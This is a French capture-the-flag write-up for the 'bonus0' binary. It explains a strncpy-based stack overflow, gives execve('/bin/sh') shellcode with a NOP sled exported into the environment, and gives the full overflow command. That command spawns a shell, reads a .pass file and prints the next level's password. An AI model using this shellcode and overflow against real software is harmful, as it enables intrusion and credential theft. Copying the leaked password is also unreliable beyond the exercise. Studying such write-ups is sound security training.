



# bonus0


## description
- Il y a un exécutable **bonus0**.
- L'exécutable attends deux entrée sur **stdin** et les affiche séparer par un espace.

## Résolution

Il y a trois fonctions(**main**, **pp** et **p**). 
Dans le main, il y a un  buffer de 42 bytes et l'appel a la fonction pp.
Dans la fonction pp, on va récupérer 2 fois 20 bytes et les séparer d'un espace.

    Dump of assembler code for function p:
       0x080484b4 <+0>:     push   %ebp
       0x080484b5 <+1>:     mov    %esp,%ebp
       0x080484b7 <+3>:     sub    $0x1018,%esp
       0x080484bd <+9>:     mov    0xc(%ebp),%eax
       0x080484c0 <+12>:    mov    %eax,(%esp)
       0x080484c3 <+15>:    call   0x80483b0 <puts@plt>
       0x080484c8 <+20>:    movl   $0x1000,0x8(%esp)
       0x080484d0 <+28>:    lea    -0x1008(%ebp),%eax
       0x080484d6 <+34>:    mov    %eax,0x4(%esp)
       0x080484da <+38>:    movl   $0x0,(%esp)
       0x080484e1 <+45>:    call   0x8048380 <read@plt>
       0x080484e6 <+50>:    movl   $0xa,0x4(%esp)
       0x080484ee <+58>:    lea    -0x1008(%ebp),%eax
       0x080484f4 <+64>:    mov    %eax,(%esp)
       0x080484f7 <+67>:    call   0x80483d0 <strchr@plt>
       0x080484fc <+72>:    movb   $0x0,(%eax)
       0x080484ff <+75>:    lea    -0x1008(%ebp),%eax
       0x08048505 <+81>:    movl   $0x14,0x8(%esp)
       0x0804850d <+89>:    mov    %eax,0x4(%esp)
       0x08048511 <+93>:    mov    0x8(%ebp),%eax
       0x08048514 <+96>:    mov    %eax,(%esp)
       0x08048517 <+99>:    call   0x80483f0 <strncpy@plt>
       0x0804851c <+104>:   leave  
       0x0804851d <+105>:   ret    
    End of assembler dump.
On voit l'utilisation de **read** pour récupérer 4096 caractères sur **stdin**.
Ensuite il y a un **strncpy** pour copier 20 caractères de ce buffer.
On va pouvoir exploiter une limitation de **strncpy**.

    If there is no null byte among the first n bytes of src, the string placed in dest will not be null-terminated.

Grace a cette limitation, on va pouvoir utiliser un shellcode.
notre shellcode : http://shell-storm.org/shellcode/files/shellcode-827.php

On va exporter notre **shellcode** dans l'environnement et faire pointer eip vers son adresse.

    export EXPLOIT=$(python -c 'print "\x90" * 1024 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
 
avec gdb, on met un **breakpoint** sur le main et retrouver l'adresse de notre variable dans l'environnement.


    (python -c 'print "A"*4095 + "\n" + "\x90"*9 + "\xe7\xf5\xff\xbf" + "B"*10'; cat -) | ./bonus0
    cat /home/user/bonus1/.pass
    cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
